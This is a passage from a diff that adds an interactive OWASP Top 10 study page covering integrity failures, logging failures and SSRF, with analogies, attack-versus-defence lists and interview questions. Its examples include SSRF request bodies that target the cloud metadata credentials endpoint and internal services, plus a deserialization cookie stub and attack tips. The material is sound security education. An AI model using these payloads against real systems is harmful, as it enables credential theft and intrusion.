+            <div class="col-defend"><div class="col-label">🛡 How to defend</div><ul class="col-list"><li>Enforce MFA everywhere possible</li><li>Use cryptographically random session tokens</li><li>Invalidate sessions on logout and password change</li><li>Account lockout + CAPTCHA after failures</li><li>Check creds against HaveIBeenPwned API</li></ul></div>
+          </div>
+        </div>
+        <div class="section">
+          <div class="section-label">🎤 Interview Questions</div>
+          <div class="interview-section">
+            <div class="interview-q">Q: What's the difference between credential stuffing and brute forcing?</div>
+            <div class="interview-q">Q: How would you test a session management implementation for weaknesses?</div>
+            <div class="interview-q">Q: What makes a session token "secure"?</div>
+          </div>
+        </div>
+        <div class="mark-learned"><button class="learn-btn" onclick="markLearned(this)">Mark as Learned</button></div>
+      </div>
+    </div>
+
+    <!-- A08 -->
+    <div class="vuln-card" style="--card-accent:#cc44ff" data-tags="high injection" data-id="8">
+      <div class="card-header" onclick="toggleCard(this)">
+        <div class="vuln-num">08</div>
+        <div class="card-title-group">
+          <div class="card-title">Software & Data Integrity Failures</div>
+          <div class="card-tags">
+            <span class="badge badge-sev-high">High</span>
+            <span class="badge badge-type">Insecure Deserialization</span>
+            <span class="badge badge-type">CI/CD</span>
+            <span class="badge badge-type">Supply Chain</span>
+          </div>
+        </div>
+        <div class="expand-icon">+</div>
+      </div>
+      <div class="card-body">
+        <div class="section">
+          <div class="section-label">What it is</div>
+          <div class="section-text">Code and infrastructure that doesn't protect against integrity violations. Includes insecure deserialization (where an attacker modifies serialized objects to achieve RCE), and CI/CD pipeline attacks where an attacker poisons the software build process. SolarWinds is the famous real-world case.</div>
+        </div>
+        <div class="section">
+          <div class="section-label">🍕 Non-Technical Analogy</div>
+          <div class="analogy-box"><p>A restaurant that receives sealed ingredient boxes from a supplier — but never checks if the seal has been tampered with. The attacker intercepts the delivery, replaces the chicken with something toxic, reseals the box, and the kitchen blindly cooks it. The food (data/code) was never verified to be what it claimed.</p></div>
+        </div>
+        <div class="section">
+          <div class="section-label">Real Attack Example</div>
+          <div class="code-block"><code><span class="comment"># Insecure deserialization (Java)</span>
+<span class="comment"># App deserializes base64 cookie without validation</span>
+Cookie: user=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
+<span class="danger">→ Attacker crafts malicious serialized object → RCE</span>
+<span class="danger">→ Tool: ysoserial.jar</span>
+
+<span class="comment"># SolarWinds (2020) supply chain attack</span>
+<span class="danger">→ Attackers compromised the BUILD server</span>
+<span class="danger">→ Malicious code injected into legitimate signed update</span>
+<span class="danger">→ 18,000+ orgs downloaded the backdoored update</span>
+
+<span class="comment"># npm package hijack</span>
+→ Attacker publishes typosquatted "lodahs" (not "lodash")
+<span class="danger">→ Developer typos → malicious code runs in CI/CD</span></code></div>
+        </div>
+        <div class="section">
+          <div class="section-label">Attack vs Defense</div>
+          <div class="two-col">
+            <div class="col-attack"><div class="col-label">⚔ How to attack</div><ul class="col-list"><li>Intercept and modify serialized objects</li><li>ysoserial for Java deserialization payloads</li><li>Tamper with JWT without signature check</li><li>Poison CI/CD pipelines (pull request attacks)</li><li>Typosquatting package names</li></ul></div>
+            <div class="col-defend"><div class="col-label">🛡 How to defend</div><ul class="col-list"><li>Verify digital signatures on packages/updates</li><li>Use subresource integrity (SRI) for CDN resources</li><li>Secure CI/CD with signed commits and code review</li><li>Avoid deserializing data from untrusted sources</li><li>Use SBOM to track what's in the software</li></ul></div>
+          </div>
+        </div>
+        <div class="section">
+          <div class="section-label">🎤 Interview Questions</div>
+          <div class="interview-section">
+            <div class="interview-q">Q: Explain insecure deserialization. Why does it often lead to RCE?</div>
+            <div class="interview-q">Q: What happened in the SolarWinds attack and how could it have been prevented?</div>
+            <div class="interview-q">Q: How can CI/CD pipelines become an attack vector?</div>
+          </div>
+        </div>
+        <div class="mark-learned"><button class="learn-btn" onclick="markLearned(this)">Mark as Learned</button></div>
+      </div>
+    </div>
+
+    <!-- A09 -->
+    <div class="vuln-card" style="--card-accent:#00ccaa" data-tags="medium" data-id="9">
+      <div class="card-header" onclick="toggleCard(this)">
+        <div class="vuln-num">09</div>
+        <div class="card-title-group">
+          <div class="card-title">Security Logging & Monitoring Failures</div>
+          <div class="card-tags">
+            <span class="badge badge-sev-med">Medium</span>
+            <span class="badge badge-type">Detection</span>
+            <span class="badge badge-type">DFIR</span>
+            <span class="badge badge-type">Audit</span>
+          </div>
+        </div>
+        <div class="expand-icon">+</div>
+      </div>
+      <div class="card-body">
+        <div class="section">
+          <div class="section-label">What it is</div>
+          <div class="section-text">Without sufficient logging and monitoring, attackers can operate undetected for months. Average breach detection time is 200+ days. This vulnerability enables attackers to persist, pivot, and exfiltrate data while defenders remain blind.</div>
+        </div>
+        <div class="section">
+          <div class="section-label">🍕 Non-Technical Analogy</div>
+          <div class="analogy-box"><p>A bank with no security cameras, no alarm triggers, no incident log. A thief breaks in at 2am, drills the vault slowly for 6 hours, leaves. Nobody knows until a teller notices cash is missing 3 weeks later. The crime happened — the failure is that nobody was watching, and the evidence was never recorded.</p></div>
+        </div>
+        <div class="section">
+          <div class="section-label">Real Attack Example</div>
+          <div class="code-block"><code><span class="comment"># What an attacker loves: no logs</span>
+→ 50,000 failed login attempts → no alert triggered
+→ Attacker pivots from web app to internal network
+→ Exfiltrates 10GB over 3 weeks → no anomaly detected
+
+<span class="comment"># Equifax breach (2017)</span>
+<span class="danger">→ Attackers active for 78 days undetected</span>
+<span class="danger">→ 143M records exfiltrated</span>
+<span class="danger">→ SSL inspection disabled → encrypted exfiltration missed</span>
+
+<span class="comment"># What good logs look like</span>
+<span class="safe">2024-01-15 02:31:44 [WARN] Failed login user:admin ip:45.33.32.156</span>
+<span class="safe">2024-01-15 02:31:45 [WARN] Failed login user:admin ip:45.33.32.156</span>
+<span class="safe">2024-01-15 02:31:45 [ALERT] Brute force detected — blocking IP</span></code></div>
+        </div>
+        <div class="section">
+          <div class="section-label">Attack vs Defense</div>
+          <div class="two-col">
+            <div class="col-attack"><div class="col-label">⚔ Attacker advantage</div><ul class="col-list"><li>Low-and-slow attacks evade threshold alerts</li><li>Log tampering to cover tracks</li><li>Living off the land (LOLBins) to blend in</li><li>Operate during business hours for noise</li><li>Delete logs before defenders notice</li></ul></div>
+            <div class="col-defend"><div class="col-label">🛡 How to defend</div><ul class="col-list"><li>Centralized SIEM (Splunk, ELK, Sentinel)</li><li>Alert on anomalies, not just signatures</li><li>Immutable logs (write-once storage)</li><li>Log all auth events, access denials, errors</li><li>Incident response plan + regular drills</li></ul></div>
+          </div>
+        </div>
+        <div class="section">
+          <div class="section-label">🎤 Interview Questions</div>
+          <div class="interview-section">
+            <div class="interview-q">Q: From an offensive perspective, why is lack of logging beneficial to attackers?</div>
+            <div class="interview-q">Q: What events should always be logged in a web application?</div>
+            <div class="interview-q">Q: What is a SIEM and how does it help with this OWASP category?</div>
+          </div>
+        </div>
+        <div class="mark-learned"><button class="learn-btn" onclick="markLearned(this)">Mark as Learned</button></div>
+      </div>
+    </div>
+
+    <!-- A10 -->
+    <div class="vuln-card" style="--card-accent:#ff44aa" data-tags="high injection" data-id="10">
+      <div class="card-header" onclick="toggleCard(this)">
+        <div class="vuln-num">10</div>
+        <div class="card-title-group">
+          <div class="card-title">Server-Side Request Forgery (SSRF)</div>
+          <div class="card-tags">
+            <span class="badge badge-sev-high">High</span>
+            <span class="badge badge-type">SSRF</span>
+            <span class="badge badge-type">Cloud Metadata</span>
+            <span class="badge badge-type">Internal Network</span>
+          </div>
+        </div>
+        <div class="expand-icon">+</div>
+      </div>
+      <div class="card-body">
+        <div class="section">
+          <div class="section-label">What it is</div>
+          <div class="section-text">The attacker makes the server send requests to unintended locations — internal services, cloud metadata APIs, or other servers. The server acts as a proxy for the attacker, bypassing firewalls and reaching internal resources that should never be public. Capital One breach (2019) was caused by SSRF.</div>
+        </div>
+        <div class="section">
+          <div class="section-label">🍕 Non-Technical Analogy</div>
+          <div class="analogy-box"><p>You can't enter a restricted government building, but you have a friend who works there. You hand your friend a letter and say "can you go ask the records room for file #4521 and bring it back to me?" Your friend (the server) fetches it on your behalf, bypassing all the security checks you would have faced at the front door.</p></div>
+        </div>
+        <div class="section">
+          <div class="section-label">Real Attack Example</div>
+          <div class="code-block"><code><span class="comment"># App accepts a URL and fetches it server-side</span>
+POST /api/preview
+{ "url": "https://legitimate-site.com" }
+
+<span class="comment"># Attacker points it to cloud metadata API</span>
+{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
+<span class="danger">→ Returns AWS IAM credentials — full cloud account takeover</span>
+
+<span class="comment"># Internal service enumeration</span>
+{ "url": "http://internal-db:5432" }   <span class="danger">→ Port scan internal network</span>
+{ "url": "http://redis:6379" }          <span class="danger">→ Access internal Redis cache</span>
+
+<span class="comment"># Capital One 2019: WAF misconfigured + SSRF</span>
+<span class="danger">→ 100M+ customer records stolen via metadata API</span></code></div>
+        </div>
+        <div class="section">
+          <div class="section-label">Attack vs Defense</div>
+          <div class="two-col">
+            <div class="col-attack"><div class="col-label">⚔ How to attack</div><ul class="col-list"><li>Find URL input fields, webhooks, PDF generators</li><li>Try 169.254.169.254 for cloud metadata</li><li>Probe internal IPs / localhost</li><li>Blind SSRF via DNS callbacks (Burp Collaborator)</li><li>Bypass filters with IP encoding tricks</li></ul></div>
+            <div class="col-defend"><div class="col-label">🛡 How to defend</div><ul class="col-list"><li>Allowlist permitted domains server-side</li><li>Block requests to private IP ranges</li><li>Disable HTTP redirects in fetch libraries</li><li>Use IMDSv2 (AWS) to require token for metadata</li><li>Segment internal network from web tier</li></ul></div>
+          </div>
+        </div>
+        <div class="section">
+          <div class="section-label">🎤 Interview Questions</div>
+          <div class="interview-section">
+            <div class="interview-q">Q: What is SSRF and why is it especially dangerous in cloud environments?</div>
+            <div class="interview-q">Q: How would you find SSRF vulnerabilities during a black-box assessment?</div>
+            <div class="interview-q">Q: A developer says they validate URLs by checking for "https://". Can an attacker bypass this?</div>
+          </div>
+        </div>
+        <div class="mark-learned"><button class="learn-btn" onclick="markLearned(this)">Mark as Learned</button></div>
+      </div>
+    </div>
+
+  </div><!-- end vuln-list -->
+
+  <!-- Cheat Sheet -->
+  <div class="cheatsheet">
+    <h2>Quick Recall Cheat Sheet</h2>
+    <div class="cheat-grid">
+      <div class="cheat-item"><div class="cheat-num">A01</div><div class="cheat-name">Broken Access Control</div><div class="cheat-keyword">IDOR · priv esc · force browse</div></div>
+      <div class="cheat-item"><div class="cheat-num">A02</div><div class="cheat-name">Crypto Failures</div><div class="cheat-keyword">MD5 · no TLS · data exposed</div></div>
+      <div class="cheat-item"><div class="cheat-num">A03</div><div class="cheat-name">Injection</div><div class="cheat-keyword">SQLi · XSS · CMDi · input</div></div>
+      <div class="cheat-item"><div class="cheat-num">A04</div><div class="cheat-name">Insecure Design</div><div class="cheat-keyword">business logic · no threat model</div></div>
+      <div class="cheat-item"><div class="cheat-num">A05</div><div class="cheat-name">Misconfiguration</div><div class="cheat-keyword">defaults · open S3 · debug on</div></div>
+      <div class="cheat-item"><div class="cheat-num">A06</div><div class="cheat-name">Outdated Components</div><div class="cheat-keyword">Log4Shell · CVEs · no patching</div></div>
+      <div class="cheat-item"><div class="cheat-num">A07</div><div class="cheat-name">Auth Failures</div><div class="cheat-keyword">weak session · brute · stuffing</div></div>
+      <div class="cheat-item"><div class="cheat-num">A08</div><div class="cheat-name">Integrity Failures</div><div class="cheat-keyword">deserialize · SolarWinds · CI/CD</div></div>
+      <div class="cheat-item"><div class="cheat-num">A09</div><div class="cheat-name">Logging Failures</div><div class="cheat-keyword">blind to attacks · no SIEM</div></div>
+      <div class="cheat-item"><div class="cheat-num">A10</div><div class="cheat-name">SSRF</div><div class="cheat-keyword">server as proxy · metadata API</div></div>
+    </div>
+  </div>
+
+</div><!-- end container -->
+
+<script>
+  function toggleCard(header) {
+    const body = header.nextElementSibling;
+    const icon = header.querySelector('.expand-icon');
+    const isOpen = body.classList.contains('open');
+    // Close all
+    document.querySelectorAll('.card-body.open').forEach(b => {
+      b.classList.remove('open');
+      b.previousElementSibling.querySelector('.expand-icon').textContent = '+';
+    });
+    if (!isOpen) {
+      body.classList.add('open');
+      icon.textContent = '−';
+    }
+  }
+
+  function markLearned(btn) {
+    const card = btn.closest('.vuln-card');
+    card.classList.toggle('learned');
+    updateProgress();
+  }
+
+  function updateProgress() {
+    const total = 10;
+    const learned = document.querySelectorAll('.vuln-card.learned').length;
+    document.getElementById('progressFill').style.width = (learned / total * 100) + '%';
+    document.getElementById('progressCount').textContent = learned + ' / ' + total;
+  }
+
+  function filterCards(filter, btn) {
+    document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+
+    document.querySelectorAll('.vuln-card').forEach(card => {
+      if (filter === 'all') {
+        card.style.display = '';
+      } else if (filter === 'learned') {
+        card.style.display = card.classList.contains('learned') ? '' : 'none';
+      } else {
+        const tags = card.dataset.tags || '';
+        card.style.display = tags.includes(filter) ? '' : 'none';
+      }
+    });
+  }
+</script>
+</body>
+</html>
